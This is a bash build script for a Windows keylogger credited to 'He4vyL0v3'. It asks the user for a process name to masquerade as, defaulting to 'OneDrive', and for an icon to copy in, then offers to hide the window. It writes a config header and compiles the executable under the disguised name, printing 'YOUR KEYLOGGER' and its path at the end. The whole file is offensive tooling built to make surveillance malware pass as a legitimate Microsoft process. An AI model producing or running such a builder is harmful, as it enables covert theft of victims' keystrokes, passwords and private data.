#!/bin/bash

spacer() {
    echo -e "\n\n"
}

logo() {
    clear
    spacer
    echo -e "\033[0;32m ______  __                           __    __ \033[0m"
    echo -e "\033[0;32m|      \|  \                         |  \  |  \\033[0m"
    echo -e "\033[0;32m \888888| 88       ______    ______  | 88  | 88\033[0m"
    echo -e "\033[0;32m  | 88  | 88      /      \  /      \ | 88  | 88\033[0m"
    echo -e "\033[0;32m  | 88  | 88     |  888888\|  888888\| 88  | 88\033[0m"
    echo -e "\033[0;32m  | 88  | 88     | 88  | 88| 88  | 88| 88  | 88\033[0m"
    echo -e "\033[0;32m _| 88_ | 88_____| 88__/ 88| 88__| 88| 88__/ 88\033[0m"
    echo -e "\033[0;32m|   88 \| 88     \88    88 \88    88 \88    88\033[0m"
    echo -e "\033[0;32m \888888 \88888888 \888888  _\8888888  \888888 \033[0m"
    echo -e "\033[0;32m                           |  \__| 88          \033[0m"
    echo -e "\033[0;32m                            \88    88          \033[0m"
    echo -e "\033[0;32m                             \888888           \033[0m"
    echo -e "\033[0;32m                                               \033[0m"
    echo -e "\033[0;32m             💚 Created by He4vyL0v3           \033[0m"
    echo -e "\033[0;32m                                               \033[0m"
}

logo
spacer
echo -e "\033[0;36mHello. Let's configure our software!\033[0m"

read -p "Enter the process name for masquerading (leave empty for default: OneDrive): " process_name
if [ -z "$process_name" ]; then
    process_name="OneDrive"
fi

read -p "Enter the path to the icon (ico), (leave empty for default): " path_to_ico
if [ -z "$path_to_ico" ]; then
    path_to_ico=""
fi

read -p "Save data to file? (y/n): " log_to_file
if [[ "$log_to_file" =~ ^[Yy]$ ]]; then
    log_to_file="true"
else
    log_to_file="false"
fi

read -p "Show debug window? (y/n): " hide_window
if [[ "$hide_window" =~ ^[Yy]$ ]]; then
    hide_window="false"
else
    hide_window="true"
fi

read -p "Print output to console? (y/n): " log_to_console
if [[ "$log_to_console" =~ ^[Yy]$ ]]; then
    log_to_console="true"
else
    log_to_console="false"
fi

if [ -z "$path_to_ico" ]; then
    if [ -f src/resources/icon_d.ico ]; then
        cp src/resources/icon_d.ico src/resources/icon.ico
        echo -e "\033[0;32mDefault icon is used (icon_d.ico renamed to icon.ico)\033[0m"
    else
        echo -e "\033[0;31mDefault icon src/resources/icon_d.ico not found!\033[0m"
        exit 1
    fi
else
    if [ -f "$path_to_ico" ]; then
        cp -f "$path_to_ico" src/resources/icon.ico
        echo -e "\033[0;32mIcon $path_to_ico copied to src/resources/icon.ico\033[0m"
    else
        echo -e "\033[0;31mSpecified icon $path_to_ico not found!\033[0m"
        exit 1
    fi
fi

spacer

echo -e "\033[0;33mYou have selected the following options:\033[0m"
echo "Process name: $process_name"
echo "Log to file: $log_to_file"
echo "Hide window: $hide_window"
echo "Log to console: $log_to_console"

read -p "Start build? (y/n): " is_build
if [[ ! "$is_build" =~ ^[Yy]$ ]]; then
    echo -e "\033[0;31mBuild cancelled by user.\033[0m"
    exit 0
fi

logo
spacer

echo -e "\033[0;33mGenerating config...\033[0m"

echo "#pragma once" > src/config.h
echo "#include <string>" >> src/config.h
echo "const bool        logToFile     = ${log_to_file};" >> src/config.h
echo "const bool        logToConsole  = ${log_to_console};" >> src/config.h
echo "const bool        hideWindow    = ${hide_window};" >> src/config.h

cd src
echo -e "\033[0;33mRemoving old build files...\033[0m"
make clean
echo -e "\033[0;33mStarting keylogger build...\033[0m"
make TARGET=${process_name}.exe
rm config.h

echo -e "\033[0;32m  ______                                     __             __               \033[0m"
echo -e "\033[0;32m /      \                                   |  \           |  \              \033[0m"
echo -e "\033[0;32m|  888888\\  ______   ______ ____    ______  | 88  ______  _| 88_     ______  \033[0m"
echo -e "\033[0;32m| 88   \\88 /      \ |      \    \  /      \ | 88 /      \|   88 \   /      \ \033[0m"
echo -e "\033[0;32m| 88      |  888888\\| 888888\\8888\\|  888888\\| 88|  888888\\\\888888  |  888888\033[0m"
echo -e "\033[0;32m| 88   __ | 88  | 88| 88 | 88 | 88| 88  | 88| 88| 88    88 | 88 __ | 88    88\033[0m"
echo -e "\033[0;32m| 88__/  \\| 88__/ 88| 88 | 88 | 88| 88__/ 88| 88| 88888888 | 88|  \\| 88888888\033[0m"
echo -e "\033[0;32m \\88    88 \\88    88| 88 | 88 | 88| 88    88| 88 \\88     \\  \\88  88 \\88      \033[0m"
echo -e "\033[0;32m  \\888888   \\888888  \\88  \\88  \\88| 8888888  \\88  \\8888888   \\8888   \\8888888\033[0m"
echo -e "\033[0;32m                                  | 88                                       \033[0m"
echo -e "\033[0;32m                                  | 88                                       \033[0m"
echo -e "\033[0;32m                                   \\88                                       \033[0m"

spacer

if [ -f "${process_name}.exe" ]; then
    echo -e "\033[0;32mYOUR KEYLOGGER: \033[0m"
    echo -e "\033[0;36m$(realpath ${process_name}.exe)\033[0m"
else
    echo -e "\033[0;31mFile src/${process_name}.exe not found! Please check that the build was successful.\033[0m"
    echo -e "\033[0;31mAvailable exe files in src:\033[0m"
    ls -1 *.exe 2>/dev/null || echo "No exe files."
fi
